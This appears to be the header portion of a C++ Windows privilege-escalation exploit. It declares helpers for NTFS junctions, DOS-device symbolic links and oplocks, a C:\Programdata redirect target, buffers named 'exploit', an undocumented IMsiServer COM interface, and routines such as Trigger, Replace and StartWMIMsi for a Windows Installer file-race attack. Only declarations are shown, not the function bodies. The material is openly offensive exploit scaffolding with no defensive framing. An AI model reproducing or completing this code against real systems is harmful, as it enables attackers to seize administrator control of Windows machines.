#include <windows.h>
#include <winternl.h>
#include <combaseapi.h>
#include <comdef.h>
#include <shobjidl.h>
#include <propsys.h>
#include <propvarutil.h>
#include <propkey.h>
#include "FileOplock.h"


#pragma warning(disable:4996)
#pragma comment(lib,"Rpcrt4.lib")
#pragma comment(lib,"Propsys.lib")
BOOL CreateJunction(HANDLE dir, LPCWSTR target);
BOOL DosDeviceSymLink(LPCWSTR object, LPCWSTR target);
BOOL DeleteJunction(HANDLE hDir);
BOOL DelDosDeviceSymLink(LPCWSTR object, LPCWSTR target);
LPWSTR BuildPath(LPCWSTR path);
BOOL Move(HANDLE hFile);
void cb0();
void cb1();
void load();
VOID GenTmp(WCHAR*);
VOID SetOplock();
VOID Trigger();
VOID DoMain();
VOID Replace();
VOID StartWMIMsi();
HRESULT GetPropertyValue(PCWSTR pszFilename, PCWSTR pszCanonicalName);
BOOL FindProperty(IPropertyStore* pps, REFPROPERTYKEY key, PCWSTR pszCanonicalName);
HRESULT GetPropertyStore(PCWSTR pszFilename, GETPROPERTYSTOREFLAGS gpsFlags, IPropertyStore** ppps);
VOID Watch();
VOID start();
BOOL firstdone = FALSE;
BOOL finished = FALSE;
HANDLE hFile2,hDir,hDir2 = NULL,hDir3;
WCHAR target[256] = L"\\??\\C:\\Programdata";
WCHAR file[256] = { 0x0 };
WCHAR object[256] = { 0x0 };
WCHAR dir[512] = { 0x0 };
WCHAR* exploit = (WCHAR*)malloc(256);
WCHAR* exploit2 = (WCHAR*)malloc(256);
NTSTATUS retcode;
DWORD sessionid;
PFILE_NOTIFY_INFORMATION fi = NULL;
HANDLE myCreateDirectory(LPWSTR file, DWORD access, DWORD share, DWORD dispostion);

struct __declspec(uuid("000C101C-0000-0000-C000-000000000046")) CLSID_MSI_Server;
class __declspec(uuid("000c101c-0000-0000-c000-000000000046")) IMsiServer : public IUnknown {
public:
    virtual HRESULT __stdcall Proc3(/* Stack Offset: 8 */ /* ENUM16 */ uint16_t p0, /* Stack Offset: 16 */ VOID* p1, /* Stack Offset: 24 */ int8_t p2, /* Stack Offset: 32 */ /* ENUM16 */ uint16_t* p3);
   
};


typedef struct _REPARSE_DATA_BUFFER {
    ULONG  ReparseTag;
    USHORT ReparseDataLength;
    USHORT Reserved;
    union {
        struct {
            USHORT SubstituteNameOffset;
            USHORT SubstituteNameLength;
            USHORT PrintNameOffset;
            USHORT PrintNameLength;
            ULONG  Flags;
            WCHAR  PathBuffer[1];
        } SymbolicLinkReparseBuffer;
        struct {
            USHORT SubstituteNameOffset;
            USHORT SubstituteNameLength;
            USHORT PrintNameOffset;
            USHORT PrintNameLength;
            WCHAR  PathBuffer[1];
        } MountPointReparseBuffer;
        struct {
            UCHAR DataBuffer[1];
        } GenericReparseBuffer;
    } DUMMYUNIONNAME;
} REPARSE_DATA_BUFFER, * PREPARSE_DATA_BUFFER;
typedef struct _OBJECT_DIRECTORY_INFORMATION {
    UNICODE_STRING Name;
    UNICODE_STRING TypeName;
} OBJECT_DIRECTORY_INFORMATION, * POBJECT_DIRECTORY_INFORMATION;
#define STATUS_MORE_ENTRIES 0x00000105
#define STATUS_NO_MORE_ENTRIES 0x8000001A
#define IO_REPARSE_TAG_MOUNT_POINT              (0xA0000003L)

typedef NTSYSAPI NTSTATUS(NTAPI* _NtCreateFile)(PHANDLE FileHandle, ACCESS_MASK DesiredAccess, POBJECT_ATTRIBUTES ObjectAttributes, PIO_STATUS_BLOCK   IoStatusBlock, PLARGE_INTEGER AllocationSize, ULONG FileAttributes, ULONG ShareAccess, ULONG CreateDisposition, ULONG CreateOptions, PVOID EaBuffer, ULONG EaLength);
typedef NTSYSAPI VOID(NTAPI* _RtlInitUnicodeString)(PUNICODE_STRING DestinationString, PCWSTR SourceString);
typedef NTSYSAPI NTSTATUS(NTAPI* _NtOpenDirectoryObject)(OUT PHANDLE DirectoryHandle, IN ACCESS_MASK DesiredAccess, POBJECT_ATTRIBUTES ObjectAttributes);
typedef NTSYSAPI NTSTATUS(NTAPI* _NtQueryDirectoryObject)(_In_      HANDLE  DirectoryHandle, _Out_opt_ PVOID   Buffer, _In_ ULONG Length, _In_ BOOLEAN ReturnSingleEntry, _In_  BOOLEAN RestartScan, _Inout_   PULONG  Context, _Out_opt_ PULONG  ReturnLength);
typedef NTSYSCALLAPI NTSTATUS(NTAPI* _NtSetInformationFile)(
    HANDLE                 FileHandle,
    PIO_STATUS_BLOCK       IoStatusBlock,
    PVOID                  FileInformation,
    ULONG                  Length,
    ULONG FileInformationClass
    );

_RtlInitUnicodeString pRtlInitUnicodeString;
_NtCreateFile pNtCreateFile;
_NtSetInformationFile pNtSetInformationFile;

